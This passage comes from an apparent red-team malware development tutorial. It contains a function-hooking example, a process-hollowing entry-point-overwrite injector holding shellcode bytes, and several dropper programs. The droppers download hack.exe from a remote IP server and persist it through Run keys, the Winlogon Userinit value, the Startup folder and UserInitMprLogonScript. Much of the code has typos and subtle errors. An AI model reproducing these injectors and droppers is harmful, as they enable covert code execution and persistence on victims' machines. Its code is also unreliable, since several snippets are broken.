    VirtualProtect((LPVOID)hookedFuncAddr, 14, PAGE_READWRITE, &amp;oldProtect);
    hookFuncAddr = (UINT_PTR)&amp;modMovFunc;

    memcpy(patch, jmpinstruction, 6);
    memcpy(patch+6, &amp;hokFuncAddr, 8);

    WriteProcessMemory(GetCurrentProcess(), (LPVOIDhookedFuncAddr, patch, 14, NULL);
    VirtualProtect((LPVOID)hookedFuncAddr, 14, oldProtect, &amp;oldProtect);
    FlushInstructionCache(GetCurrentProcess(), (LPVOID)hookedFuncAddr, 14);
}

int main() {
    HINSTANCE entDll;
    OrigMovFunc origMovFunc;

    entDll = LoadLibrary("entertainmentDll.dll");
    if(entDll == NULL){
        return 1;
    }

    origMovFunc = (OrigMovFunc)GetProcAddress(entDll, "Movie");
    if (origMovFunc == NULL){
        return 1;
    }

    (origMovFunc)("Spider-Man: Across the Spider-Verse");
    installhook();
    (origMovFunc)("Spider-Man: Across the Spider-Verse");

    return 0;
}
</code></pre>
<p>Here's a breakdown of what happened:</p>
<ul>
<li><code>typedef int (__cdecl OrigMovFunc)</code>: Creates an alias, <code>OrigMovFunc</code>, for a function signature, allowing equivalent functions to be declared, defined, or referenced using that alias.</li>
<li><code>void installHook(){...}</code>: A buffer is allocated for the 14-byte patch (our hook) inside the <code>Movie</code> function. The full, 6-byte <code>JMP</code> instruction opcode is written as a list of character codes. A 64-bit pointer is created to reference the modified <code>Movie</code> function, our hook function. Then, the first 14 bytes of the target function are saved and this memory space is made writable (<code>RW</code>). The <code>JMP</code> instruction and the 8 byte absolute address of the hook function are written into the beginning of the hooked function. Then, the permissions are reverted (<code>RX</code>) and the instruction cache is flushed.</li>
<li><code>ReadProcessMemory</code>: Copies a specified block of memory from the address space of a designated process, into a buffer in the current process's address space. Requires having the <code>PROCESS_VM_READ</code> access right to the target process. It is a core component of the Windows API used to inspect the memory contents of a running application.
<pre><code class="language-C">BOOL ReadProcessMemory(
    [in] HANDLE hProcess,
    [in] LPCVOID lpBaseAddress,
    [out] LPVOID lpBuffer,
    [in] SIZE_T nSize,
    [out] SIZE_T *lpNmberofBytesRead
);
</code></pre>
Here is a breakdown of the <code>ReadProcessMemory</code> function's parameters:
<ul>
<li><code>hProcess</code>: Handle to the target process whose memory is to be read. Must have the <code>PROESS_VM_READ</code> access right.</li>
<li><code>lpBaseAddress</code>: The base virtual address in the target process from which the read operation should begin.</li>
<li><code>lpBuffer</code>: A pointer to a buffer in the calling process's address space. The data read from the target process will be copied here.</li>
<li><code>nSize</code>: The number of bytes to be copied from the target process's memory into your local buffer.</li>
<li><code>lpNumberOfBytesRead</code>: An optional pointer to a variable that receives the actual number of bytes transferred into the local buffer. This can be less than <code>nSize</code> if the memory read fails partway through. If <code>NULL</code> it is ignored.</li>
<li><code>ReadProcessMemory</code> returns <code>TRUE</code> is successful, <code>FALSE</code> if failure. Use <code>GetLastError()</code> to get more information.</li>
</ul>
</li>
<li><code>int __stdcall modMovFunc (LPCTSTR message){...}</code>: The first 14 bytes of the hooked function are made writable, the original instruction bytes are written into that space and the permissions are reverted (<code>RX</code>). Then, the instruction cache is flushed and the original <code>Movie</code> function is called with a new parameter, "Everything, Everywhere, All At Once".</li>
<li><code>FlushInstructionCache</code>: An essential Windows API that synchronizes the contents of the CPUs instruction cache and any non coherent caches with the contents of memory. FOrces the CPU to discard its stale cache entries and re-read the instructions from memory, guaranteeing that newly written code is executed immediately.
<pre><code class="language-C">BOOL FlushInstructionCache(
    [in] HANDLE hProcess,
    [in] LPCVOID lpBaseAddress,
    [in] SIZE_T dwSize
);
</code></pre>
Here is a breakdown of the <code>FlushInstructionCache</code> function's parameters:
<ul>
<li><code>hProcess</code>: A handle to the process whose instruction cache is to be flushed.</li>
<li><code>lpBaseAddress</code>: the base address in the target process where the modified region begins. <code>NULL</code> to flush entire cache.</li>
<li><code>dwSize</code>: Size, in bytes, of the instruction region to be flushed.</li>
</ul>
</li>
<li><code>int main(){...}</code>: Loads <code>entDll</code>, then runs the original <code>Movie</code> function. Next, the hook is installed and the original <code>Movie</code> function is called again.</li>
</ul>
<h3 id="process-hollowing"><a class="header" href="#process-hollowing">Process Hollowing</a></h3>
<p>'Process Hollowing' is an attack method where an adversary starts a legitimate, benign process in a suspended state and then completely replaces its executable code with malicious content. The goal is for the malicious code to run under the guise and context of a legitimate process, making it much harder for security software and analysts to identify the true nature of the running program. There are <strong>6 Core Steps</strong> to process hollowing:</p>
<ol>
<li><strong>Creation of the Suspended Target Process</strong>: The injector uses the <code>CreateProcess</code> API with the <code>CREATE_SUSPENDED</code> flag to start with a new legitimate host process, but immediately freezes its main thread, preventing the host form executing its original code</li>
<li><strong>Hollowing the Process</strong>: The injector analyzes the suspended process's memory to find it's Image Base Address. It then uses <code>NtUnmapViewOfSection</code> or a similar function to unmap the legitimate PE file from the process's memory space, leaving a large chunk of hollowed, unallocated memory.</li>
<li><strong>Allocating Space for the Malicious Image</strong>: The injector allocates new memory space inside the hollowed process using <code>VirtualAllocEx</code> at the same preferred Image Base Address, or at least the same sized region, as the original executable.</li>
<li><strong>Writing the Malicious Image</strong>: The injector writes the sections (i.e., <code>.text</code> or <code>.data</code>) of the malicious PE file into the newly allocated memory space within the target process using <code>WriteProcessMemory</code>.</li>
<li><strong>Redirecting the Execution Flow</strong>: The injector modifies <code>RAX</code>/<code>EAX</code> of the suspended thread's context to point to the Entry Point of the newly injected malicious PE using <code>GetThreadContext</code> and <code>SetThreadContext</code>.</li>
<li><strong>Resuming Execution</strong>: The injector calls <code>ResumeThread</code>, jumping directly to the entry point of the malicious code while still appearing in the operating system as a legitimate process.</li>
</ol>
<p><strong>Entry Point Overwriting</strong> is a simplified form of Process Hollowing that only hollows out the entry point with shellcode, without unmapping anything else. Here is an example:</p>
<pre><code class="language-C">#include &lt;windows.h&gt;
#include &lt;winternl.h&gt;
#include &lt;stdio.h&gt;

int main() {
    ULONG returnLength;
    DWORD oldProtect;
    PVOID baseAddress;
    SIZE_T bytesRead;
    SIZE_T bytesWritten;

    unsigned char payload[] =
    "\xfc\x48\x83..."
    [...trunc...]
    "...\xda\xff\xd5";

    STARTUPINFOW si = {0};
    PROCESS_INFORMATION pi = {0};
    IMAGE_DOS_HEADER dHeader = {0};
    IMAGE_NT_HEADERS ntHeaders = {0};

    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    CreateProcessW(
        L"C:\\Windows\\System32\\cmd.exe",
        NULL, NULL, NULL, FALSE,
        CREATE_SUSPENDED,
        NULL,
        L"C:\\Windows\\System32", &amp;si, &amp;pi
    );

    NtQueryInformationProcess(
        pi.hProcess,
        ProcessBasicInformation,
        &amp;pbi,
        sizeoff(pbi),
        &amp;returnLength
    );

    auto lpBaseAddress = (LPVOID)((DWORD64)(pbi.PebBaseAddress) + 0x10);
    baseAddress = 0;
    bytesRead = 0;
    ReadProcessMemory(
        pi.hProcess,
        baseAddress,
        &amp;dHeader,
        sizeof(dHeader),
        &amp;bytesRead
    );

    auto lpNtHeader = (LPVOID)((DWORD64)baseAddress + dHeader.e_lfanew);
    ReadProcessMemory(
        pi.hProcess,
        lpNtHeader,
        &amp;ntHeaders,
        sizeof(ntHeaders),
        &amp;bytesRead
    );

    auto entryPoint = (LPVOID)((DWORD64)baseAddress + ntHeaders.OptionalHeader.AddressOfEntryPoint);
    VirtualProtectEx(
        pi.hProcess,
        entryPoint,
        sizeof(payload),
        PAGE_READWRITE,
        &amp;oldProtect
    );

    WriteProcessMemory(
        pi.hProcess,
        entryPoint,
        payload,
        sizeof(payload),
        &amp;bytesWritten
    );

    VirtualProtectEx(
        pi.hProcess,
        entryPoint,
        sizeof(payload),
        oldProtect,
        &amp;oldProtect
    );
}
</code></pre>
<p>Where:</p>
<ul>
<li>
<p><code>NtQueryInformationProcess</code>: A Native API function in the Windows kernel, used to retrieve various pieces of non-public, specific information about a process object. Helps gather insights into a running process's state, environment and security context.</p>
<ul>
<li>Acts as a versatile internal query tool for the kernel's Object Manager. It takes a Process Handle and an information class, and fills a buffer with requested data, including:
<ul>
<li><code>Process Basic Information</code>: The entry point address, Process ID, Parent Process ID and the base address of the Process Environment Block (PEB).</li>
<li><code>Process Image Filename</code>: The full path to the executable file.</li>
<li><code>Process Breakpoints</code>: Information about breakpoints set within the process</li>
<li><code>Process Security</code>: Details about the process's token and integrity level.</li>
</ul>
</li>
</ul>
<pre><code class="language-C">__NTSYSAPI NTSTATUS NTAPI NtQueryInformationProcess(
    [in] HANDLE ProcessHandle,
    [in] PROCESS_INFORMATION_CLASS ProcessInformationClass,
    [out] PVOID ProcessInformation,
    [in] ULONG ProcessInformationLength,
    [out, optional] PULONG ReturnLength
)
</code></pre>
<p>Here is a breakdown of the <code>NtQueryInformationProcess</code> function's parameters:</p>
<ul>
<li><code>ProcessHandle</code>: A handle to the process about which information is being requested. This handle must have the appropriate access rights (i.e., <code>PROCESS_QUERY_INFORMATION</code>).</li>
<li><code>ProcessInformationClass</code>: A value from the enumeration that specifies the exact type of information to retrieve.
<ul>
<li><code>ProcessBasicInformation</code>: Gets a <code>PROCESS_BASIC_INFORMATION</code> structure, which contains essential process details like the exit status, the base address of the PEB, the Process ID, and the Parent Process ID.</li>
<li><code>ProcessImageFileName</code>: Retrieves the full path and file name of the executable image for the process.</li>
<li><code>ProcessWow64Information</code>: Used on 64-bit systems to determine if a process is a 32-bit application running under the WoW64 compatability layer.</li>
<li><code>ProcessSessionInformation</code>: Gets the Terminal Services Session ID, needed to manage or communicate with processes across different user sessions.</li>
<li><code>ProcessDebugPort</code>: Gets the debug port number, used by debuggers to check if a process is being debugged.</li>
<li><code>ProcessHandleCount</code>: Used to get the number of open handles currently owned by the process.</li>
<li><code>ProcessQuotaLimits</code>: Gathers information about a process's page file usage, working set size limits, etc. to monitor and manage process resource consumption.</li>
</ul>
</li>
<li><code>ProcessInformation</code>: A pointer to a buffer that receives the requested process information, formatted based on the <code>ProcessInformationClass</code>.</li>
<li><code>ProcessInformationLength</code>: The size, in bytes of the output buffer pointed to by <code>ProcessInformation</code>.</li>
<li><code>ReturnLength</code>: An optional pointer to a variable that receives the actual size, in bytes of the information returned in the buffer.</li>
</ul>
<p><code>NtQueryInformationProcess</code> returns an <code>NTSTATUS</code> value. <code>STATUS_SUCCESS</code> indicates the operation completed successfully.</p>
</li>
<li>
<p><code>auto</code>: An instruction in <code>C++</code>, which tells the compiler to automatically deduce the data type of the variable from the type of its initializer.</p>
</li>
<li>
<p><code>IMAGE_DOS_HEADER</code>: A data type which is used to create a structure representing the legacy header found at the very start of a PE file.</p>
</li>
<li>
<p><code>IMAGE_NT_HEADERS</code>: The primary entry point for the modern Windows Operating System loader, located at the file offset value specified by the <code>e_lfanew</code> field of the proceeding <code>IMAGE_DOS_HEADER</code>.</p>
</li>
<li>
<p><code>VirtualProtectEx</code>: A fundamental function in the Windows Memory management PAI, used to change the protection attributes of a region of memory within the address space of a specified process. It is exported by <code>kernel32.dll</code>.</p>
<pre><code class="language-C">BOOL VirtualProtectEx(
    [in] HANDLE hProcess,
    [in] LPVOID lpAddress,
    [in] SIZE_T dwSize,
    [in] DWORD flNewProtect,
    [out] PDWORD lpflOldProtect
);
</code></pre>
<p>Here is a breakdown of the <code>VirtualProtectEx</code> function's parameters:</p>
<ul>
<li><code>hProcess</code>: A handle to the target process whose memory protection is to be changed. The handle must have the <code>PROCESS_VM_OPERATION</code> access right.</li>
<li><code>lpAddress</code>: The base address of the region of memory pages whose protection attributes are to be changed.</li>
<li><code>dwSize</code>: The size, in bytes of the region whose protection attributes are to be changed. The region is extended to encompass all memory pages in the range.</li>
<li><code>flNewProtect</code>: The new memory protection options (i.e., <code>PAGE_EXECUTE_READ</code>)</li>
<li><code>lpflOldProtect</code>: A pointer to a variable that receives the previous protection attributes of the first page in the specified region. This is essential for restoring permissions later.</li>
</ul>
</li>
</ul>
<h2 id="conclusion-2"><a class="header" href="#conclusion-2">Conclusion</a></h2>
<p>Malware generally describes any software designed to facilitate malicious actions on a computer system. Fundamentally, it takes advantage of vulnerabilities identified by a developer, which allow them to access accounts, gather data, and/or manipulate access to programs and services. Typically, some form of communication channel is established between a remote, target machine and the machine the attack was initialized from, such as a reverse shell, which manages communication between the two machines, allowing the transmission of instructions and data at each end. Malware development plays a very important role in managing Red Team Operations. Even though there are tools that exist which can automatically generate payloads of many forms, understanding the low-level functions and configurations of these payloads significantly contributes to whether or not the payload can actually be downloaded and run on a target system.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="malware-persistence"><a class="header" href="#malware-persistence">Malware Persistence</a></h1>
<p>Malware persistence allows you to continue an operation, even after a system is restarted or the target user logs off. Here, we will discuss some of the classic ways malware persists on Windows systems. However, classic methods are known, so we will also review some techniques for identifying new persistence methods.</p>
<h2 id="utilizing-the-windows-user-logon-process-for-persistence"><a class="header" href="#utilizing-the-windows-user-logon-process-for-persistence">Utilizing the Windows User Logon Process for Persistence</a></h2>
<p>Previously, when we reviewed the <strong>Windows Boot-Up Process</strong>, there was a discussion about <code>winlogon.exe</code> and <code>explorer.exe</code>. These two executables play a vital role in the <strong>Windows User Logon Process</strong>, as they are responsible for setting up the user environment and initializing the GUI. Once the user authenticates against the <strong>Local Security Authority Subsystem Service</strong> (LSASS) and their access token has been created, <code>winlogon.exe</code> launches <code>userinit.exe</code>, the first user-mode application. It is directly responsible for setting up the user environment, following these steps in order:</p>
<ol>
<li><strong>Launch Applications in the RunOnce Registry</strong></li>
<li><strong>Apply Group Policy Settings and Run Synchronous Logon Scripts</strong></li>
<li><strong>Load the User Profiles from <code>NTUSER.DAT</code>, including environment variables (<code>HKCU\Environment</code>)</strong></li>
<li><strong>Execute Legacy Logon Scripts in <code>UserInitMprLogonScript</code></strong></li>
<li><strong>Read <code>Shell</code> value from <code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell</code> (usually <code>explorer.exe</code>), then launch</strong></li>
</ol>
<p>If <code>explorer.exe</code> is launched as the shell, it takes over the task or running the remaining auto-start items asynchronously. This being:</p>
<ul>
<li><strong>The Standard <code>Run</code> Registry Keys</strong></li>
<li><strong>The Startup Folder</strong></li>
</ul>
<p>The <strong>Windows User Logon Process</strong> is ripe with spaces to save malware for persistence. In this section, we will review a few methods that can be used.</p>
<h3 id="registry-run-keys"><a class="header" href="#registry-run-keys">Registry Run Keys</a></h3>
<p>We previously went over the <code>Run</code> and <code>RunOnce</code> registry keys. Any entry located in these registries will result in the automatic execution of the associated application once the user logs in. This is extremely convenient for malware persistence, as a new key, placed in the right entry, will ensure your payload remains on the system so there's no need to exploit the system again.</p>
<p>Here is a basic example:</p>
<pre><code class="language-C">// hack c
#include &lt;windows.h&gt;
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow){
    MessageBoxA(NULL, "You Have Been Hacked!", "&gt;:)", MB_OK);
    return 0;
}
</code></pre>
<p>This is our payload, and is responsible for conducting the malicious activity. Now this program does not inherently persist on the target. The functionality can be added directly to the program, but that increases the detection surface of the payload. Instead, we can create a new file to perform the persistence function.</p>
<p>While there are a variety of techniques that can be used to solve this problem, at this stage in our learning, a <strong>dropper</strong> will suffice. Basically, a dropper is a program that downloads/installs one or more payloads, to a host, then typically sets up some form of persistence. In our example, it can be considered a <code>downloader</code>+<code>dropper</code>, since the dropper does not contain the payload and instead downloads it from a web server:</p>
<pre><code class="language-C">// dropper.c
#include &lt;windows.h&gt;

int main(int argc, char* argv[]){
    HKEY hKey = NULL;
    const char* exe_path = "\\\%USERPROFILE\%\\hack.exe"

    HRESULT downloadedFile = URL DownloadToFile(NULL, "http://172.30.1.41:8000/hack.exe", exe_path, 0, NULL);

    long result = RegOpenKeyEx(HKEY_CURRENT_USER, (LPCSTR)"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &amp;hKey);
    if(result == ERROR_SUCCESS){
        RegSetValueEx(hKey, (LPCSTR)"hack", 0, REG_SZ, (unsigned char*)exe_path, strlen(exe_path));
        RegCloseKey(hKey);
    }
    return 0;
}
</code></pre>
<p>Where:</p>
<ul>
<li><code>HKEY</code>: A handle to a specific key in the Windows Registry.</li>
<li><code>URLDownloadToFile</code>: A core Windows API function used to download data from a specified URL and save it directly to a local file. Part of the <strong>URL Moniker</strong> (<code>urlmon.h</code>) library, which is integrated with the Windows Shell and Internet Explorer network stack.
<pre><code class="language-C">HRESULT URLDownloadToFile(
    [in] LPUNKNOWN pCaller,
    [in] LPCTSTR szURL,
    [in] LPCTSTR szFileName,
    [in] DWORD dwReserved,
    [in] LPBINDSTATUSCALLBACK lpfnCB
);
</code></pre>
Here is a breakdown or the <code>URLDOwnloadToFile</code> function's parameters:
<ul>
<li><code>pCaller</code>: A pointer to the calling object's <code>IUNKNOWN</code> interface. This is typically used for COM object handling. Set to 'NULL' for simple, non-COM based downloads.</li>
<li><code>szURL</code>: A pointer to a null-terminated string containing the URL from which to download the file.</li>
<li><code>szFileName</code>: A pointer to a null-terminated string specifying the path and filename where the downloaded data will be saved.</li>
<li><code>dwReserved</code>: Reserved for future use by Microsoft. Must be set to 0.</li>
<li><code>lpfnCB</code>: A pointer to the client's <code>lBindStatusCallback</code> interface. This interface allows the caller to receive progress updates, cancel the download, or receive status notifications during the transfer. Usually set to <code>NULL</code> for a synchronous download without progress tracking.</li>
<li><code>URLDownloadToFile</code> returns an <code>HRESULT</code> value. <code>S_OK</code> indicates success. Any other value indicates an error (i.e., network failure, file write permission issues).</li>
</ul>
</li>
<li><code>RegOpenKeyEx</code>: A Windows API function used to obtain a handle (<code>HKEY</code>) to an existing key, which can then be used by other functions (i.e., <code>RegQueryValueEx</code>, <code>RegSetValueEx</code>, etc.) to read or modify the key's values and subkeys.
<pre><code class="language-C">LONG RegOpenKeyEx(
    [in] HKEY hKey,
    [in, optional] LPCWSTR lpSubKey,
    [in] DWORD ulOptions,
    [in] REGSAM samDesired,
    [out] PHKEY phkResult
);
</code></pre>
Here is a breakdown of the <code>RegOpenKeyEx</code> functions' parameters:
<ul>
<li><code>hKey</code>: A handle to an already open key or one of the predefined root keys (i.e., <code>HKEY_LOCAL_MACHINE</code>)</li>
<li><code>lpSubKey</code>: The name of the subkey to be opened relative to the key specified by hKey. Must be a null-terminated <strong>Unicode</strong> string (i.e., <code>L"Software\\Microsoft"</code>).</li>
<li><code>ulOptions</code>: Reserved for future use. Must be set to 0.</li>
<li><code>samDesired</code>: A mask that specifies the access rights needed for the key (i.e., read, write, delete). Dictates what operations you are allowed to perform on the key:
<ul>
<li><code>KEY_READ</code>: Required for querying key values and subkey data.</li>
<li><code>KEY_SET_VALUE</code>: Required for writing new values or modifying existing ones.</li>
<li><code>KEY_ALL_ACCESS</code>: Requests all possible access rights. Generally discouraged for security reasons. Request only the permissions needed.</li>
<li><code>KEY_WOW64_32KEY</code> or <code>KEY_WOW64_64KEY</code>: Used in 32-bit applications running on 64-bit Windows systems (<code>WOW64</code>) to explicitly specify which registry view to access.</li>
</ul>
</li>
<li><code>phkResult</code>: A pointer to an HKEY variable that receives the handle to the opened subkey upon success.</li>
<li><code>RegOpenKeyEx</code> returns a LONG value. If the function succeeded, the return value is <code>ERROR_SUCCESS</code>(0). Upon failure, the return value is a non-zero error code (i.e. <code>ERROR_FILE_NOT_FOUND</code>).</li>
</ul>
</li>
<li><code>RegSetValueEx</code>: A Windows API function used to set the data and type for a specified value within an open registry key.
<pre><code class="language-C">LONG RegSetValueEx(
    [in] HKEY hKey,
    [in, optional] LPCWSTR lpValueName,
);
</code></pre>
Here is a breakdown of the <code>RegSetValueEx</code> function's parameters:
<ul>
<li><code>hKey</code>: A handle to an open registry key. This handle must have been oped with the <code>KEY_SET_VALUE</code> access right.</li>
<li><code>lpValueName</code>: The name of the value to be set or created. Must be a null-terminated <strong>Unicode</strong> string.</li>
<li><code>Reserved</code>: Reserved for future use. Must be set to 0.</li>
<li><code>dwType</code>: The type of data to be stored. This is crucial for how the data is interpreted by the system. Common types include <code>REG_SZ</code> (string) and <code>REG_DWORD</code> (32-bit number).</li>
<li><code>lpData</code>: A pointer to the data buffer that contains the actual data to be stored. The format must match the <code>dwType</code>.</li>
<li><code>cbData</code>: The size, in bytes of the data pointed to by <code>lpData</code>. Must include all bytes, including null-terminators.</li>
<li><code>RegSetValueEx</code> returns a LONG value, <code>ERROR_SUCCESS</code>(0) on success. Non-zero value upon failure.</li>
</ul>
</li>
<li><code>RegCloseKey</code>: A Windows API function used to receive the handle to a specified open registry key. A critical cleanup function as failing to close an <code>HKEY</code> handle can lead to resource leaks, and in some cases, can prevent the registry key from being modified or deleted by other processes.
<pre><code class="language-C">LONG RegCloseKey(
    [in] HKEY hKey
);
</code></pre>
Here is a breakdown of the <code>RegCloseKey</code> function's parameters:
<ul>
<li><code>hKey</code>: A handle to the open registry key that you want to close. This handle is invalidated after the function returns successfully and should not be used again.</li>
<li><code>RegCloseKey</code> returns a LONG value, <code>ERROR_SUCCESS</code> if successful. Non-zero value upon failure.</li>
</ul>
</li>
</ul>
<p>This dropper must be run with <strong>Administrator (elevated)</strong> privileges on Windows 10+ since, be default, Administrator/User accounts do not have a high enough integrity level (<code>High</code> Integrity Level or greater is required).</p>
<h3 id="the-winlogon-process"><a class="header" href="#the-winlogon-process">The Winlogon Process</a></h3>
<p><code>Winlogon.exe</code> manages user logon and logoff operations, managing system starting and shutdown procedures, as well as implementing screen locking functionality. It uses the following Registry Keys for different purposes:</p>
<ul>
<li><code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell</code>: Tells Windows which program to start after a user has logged on. The specified executable becomes the user's shell, meaning every logon session will launch that program instead of <code>explorer.exe</code>, unless the custom program explicitly starts Explorer itself.</li>
<li><code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlong\Userinit</code>: Specifies the program(s) that run immediately after credential validation, before the shell is started. Pointing the entry value to a different executable (or a comma-separated list such as <code>myinit.exe</code>, <code>userinit.exe</code>) lets you execute custom code at logon-used for legitimate startup tasks, or in malicious contexts, persistence.</li>
</ul>
<p>These Registry keys are only readable by a user with a <code>Medium</code> Integrity Level or higher. A minimum of a <code>High</code> IL is required to modify them on Windows 10+.</p>
<p>Here is an example of how it works:</p>
<pre><code class="language-C">// hack.c
#include &lt;windows.h&gt;

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow){
    MessageBoxA(NULL, "You have been hacked!", "&gt;:)", MB_OK);
    return 0;
}
</code></pre>
<p>The modifications made by our dropper to the <code>Userinit</code> registry key will lead to both activation of <code>explorer.exe</code> and <code>hack.exe</code> upon user logon:</p>
<pre><code class="language-C">// dropper_userinit.c
#include &lt;windows.h&gt;
#include &lt;string.h&gt;
#include &lt;stdio.h&gt;

int main(int argc, char* argv[]){
    HKEY hKey = NULL;
    const char* sh = "C:\\Windows\\System32\\hack.exe";
    const char* exe = "C:\\Windows\\System32\\userinit.exe,C:\\Windows\\System32\\hack.exe";
    HRESULT downloadedFile = URLDownloadToFile(NULL, "http://172.30.1.41:8000/hack.exe", sh, 0, NULL);
    printf("Running\n");
    LONG result = RegOpenKeyEx(HKEY_LOCAL_MACHINE, (LPCSTR)"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", 0, KEY_WRITE, &amp;hKey);
    if (result == ERROR_SUCCESS){
        RegSetValueEx(
            hKey,
            (LPCSTR)"Userinit",
            0, REG_SZ,
            (unsigned char*)exe,
            strlen(exe)
        );
        RegCloseKey(hKey);
        printf("Key Written Successfully!\n");
    } else {
        printf("Something went wrong %d\n", GetLastError());
    }
    return 0;
}
</code></pre>
<p>By default on Windows 10+ systems, modifications to the Winlogon helper can only be performed by authorized administrators.</p>
<h3 id="the-startup-folder"><a class="header" href="#the-startup-folder">The Startup Folder</a></h3>
<p>The Startup Folder is a special directory that Windows checks each time a user logs on. Any shortcuts scripts or executable files placed in this folder are automatically launched at logon, allowing programs to start automatically, after <code>explorer.exe</code> is launched. Startup applications can apply to a single user or the system as a whole. These folders are typically located at:</p>
<ul>
<li><code>%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup</code></li>
<li><code>%ProgramData%\Microsoft\Windows\Start Menu\Programs\Startup</code></li>
</ul>
<p>Where:</p>
<ul>
<li><code>%APPDATA%</code> expands to <code>C:\Users\&lt;username&gt;\AppData\Roaming</code></li>
<li><code>%ProgramData</code> expands to <code>C:\ProgramData</code></li>
</ul>
<p>When a user logs on, Windows reads the <code>All Users</code> Startup folder first, then the <code>Current User</code> Startup folder. Each item (usually a shortcut <code>.lnk</code>) is executed in the order it appears.</p>
<p>Here is an example of a basic program:</p>
<pre><code class="language-C">#include &lt;windows.h&gt;

int main() {
    HRESULT downloadedFile = URLDownloadToFile(
        NULL,
        "http://172.30.1.41:8000/hack_cmd.exe",
        "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\hack_cmd.exe",
        0,
        NULL
    );
}
</code></pre>
<p>By installing the file directly in the Startup folder, it should launch right after a user logs on, establishing persistence.</p>
<h3 id="userinitmprlogonscript"><a class="header" href="#userinitmprlogonscript"><code>UserInitMprLogonScript</code></a></h3>
<p><code>UserInitMprLogonScript</code> can be used to store persistent scripts. However it is rare for programs to actually save data here. Usually, the <code>Run</code>/<code>RunOnce</code> registry keys provide better OpSec because they blend in more with normal system activity and are less likely to be flagged by baseline monitoring. This is, however, entirely depended on the defender's diligence in monitoring their networks and systems.</p>
<p><code>UserInitMprLogonScript</code> scripts can be saved at:</p>
<ul>
<li><code>HKCU\Environment\UserInitMprLogonScript</code></li>
<li><code>HKLM\Environment\UserInitMprLogonScript</code></li>
<li><code>HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment\UserInitMprLogonScript</code></li>
</ul>
<pre><code class="language-C">#include &lt;windows.h&gt;

int main(){
    HKEY hKey = NULL;
    const char* payload_path = "C:\\Windows\\System32\\hack.exe";
    HRESULT downloadedFile = URLDownloadToFile(
        NULL,
        "http://172.30.1.41:8000/hack.exe",
        (LPCSTR)payload_path,
        0,
        NULL
    );
    LONG result = RegOpenKeyEx(
        HKEY_CURRENT_USER,
        (LPCSTR)"Environment",
        0,
        KEY_WRITE,
        &amp;hKey
    );
    if(result == ERROR_SUCCESS){
        RegSetValueEx(
            hKey,
            (LPCSTR)"UserInitMprLogonScript",
            0,
            REG_SZ,
            (const unsigned char*)payload_path,
            strlen(payload_path)
        );
        RegCloseKey(hKey);
    }
    return 0;
}
</code></pre>
<h2 id="powershell-profiles"><a class="header" href="#powershell-profiles">PowerShell Profiles</a></h2>
<p>PowerShell Profiles are acripts that run automatically every time a new PowerShell session starts. They are used to customize the PowerShell environment, allowing you to load specific settings, define aliases, functions and variables, or import modules that you want to be made available in each session automatically.</p>
<p>PowerShell provides an automatic variable named <code>$PROFILE</code>, which stores the path to the current user's/host's profile file, making it easy to locate, create, and modify the profile script(s). The PowerShell execution policy must allow scripts (<code>.ps1</code>) to run for the profile to load automatically. The default <code>Restricted</code> policy on Windows 10+ prevents all scripts, including profiles, from running. This can be checked using the <code>Get-ExecutionPolicy</code> cmdlet or viewing the following Registry keys, in order:</p>
<ol>
<li><strong>Machine Policy</strong> (Group Policy): <code>HKLM\Software\Policies\Microsoft\Widows\PowerShell</code></li>
<li><strong>User Policy</strong> (Group Policy): <code>HKCU\Software\Policies\Microsoft\Windows\PowerShell</code></li>
<li><strong>LocalMachine</strong> (Local Setting): <code>HKLM\Software\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell</code></li>
<li><strong>Current User</strong> (User Setting): <code>HKCU\Software\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell</code></li>
<li><strong>Process</strong> (Current Session): Temporary; Does not have a Registry Key Entry. Use (<code>Get-ExecutionPolicy -scope Process</code>)</li>
</ol>
<p>In PowerShell, <code>Get-ExecutionPolicy -list</code> will quickly get the values of each of these Execution Policy Scopes, where:</p>
<ul>
<li><code>Restricted</code>: Locks down PowerShell so that it operates strictly as an interactive shell, preventing you from running scripts.</li>
<li><code>Unrestricted</code>: Allows all PowerShell scripts to run without any content restrictions, although unsigned scripts from a remote origin will display a warning prompt asking for permission to run.</li>
<li><code>Remote Signed</code>: Allows locally created scripts to run without a signature, but remotely sourced scripts must be signed by a trusted publisher to run.</li>
<li><code>AllSigned</code>: Requires all PowerShell scripts and configuration files, regardless of where they are sourced, to have a valid digital signature from a trusted publisher in order to run.</li>
<li><code>Undefined</code>: A value has not been set for that particular scope, allowing policies from scopes with higher precedence to take effect. If all scopes are undefined, Windows clients default to restricted and Windows Servers default to <code>RemoteSigned</code>.</li>
</ul>
<p>The order of scope precedence (from highest to lowest) is:</p>
<ol>
<li><code>MachinePolicy</code></li>
<li><code>UserPolicy</code></li>
<li><code>Process</code></li>
<li><code>CurrentUser</code></li>
<li><code>LocalMachine</code></li>
</ol>
<p>PowerShell supports several profile files, depending on the user and the specific host program being run (i.e., the standard console, the Integrated Scripting Environment (ISE) or Visual Studio Code). They are executed in a order, from general to particular, allowing for a layered configuration:</p>
<ul>
<li><strong>All Users, All Hosts</strong>: Applies to all users and all PowerShell host programs on the computer. Found at <code>$PSHOME\Profile.ps1</code>.</li>
<li><strong>All Users, Current Host</strong>: Applies to all users, but is specific to the current host programs. Found at <code>$PSHOME\Microsoft.PowerShell_profile.ps1</code>.</li>
<li><strong>Current User, All Hosts</strong>: Applies only to the current user but works across all host programs. Found at <code>$HOME\Documents\WindowsPowerShell\Profile.ps1</code></li>
<li><strong>Current User, Current Host</strong>: Applies only to the current user and is specific to the current host program (most commonly used). Found at <code>$HOME\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1</code></li>
